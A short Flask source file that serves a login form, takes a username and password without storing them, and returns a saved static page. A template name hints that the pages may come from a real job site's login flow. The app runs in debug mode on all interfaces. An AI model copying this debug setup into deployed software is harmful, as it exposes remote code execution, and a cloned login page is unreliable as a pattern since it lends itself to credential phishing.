from flask import Flask, render_template, request
from flask import Response
import subprocess
import json

app = Flask(__name__)

# your custom logic that generates next HTML content
# render_template("https%3A%2F%2Fjobinja.ir.html")
def generate_next_page():
    
    with open("templates/1.html", "r", encoding="utf-8") as f:
        html = f.read()
    return Response(html, mimetype="text/html")

@app.route("/", methods=["GET"])
def login_page():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    # IMPORTANT: do NOT forward or store credentials
    # just use them for flow logic if needed
    html = generate_next_page()

    return html


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)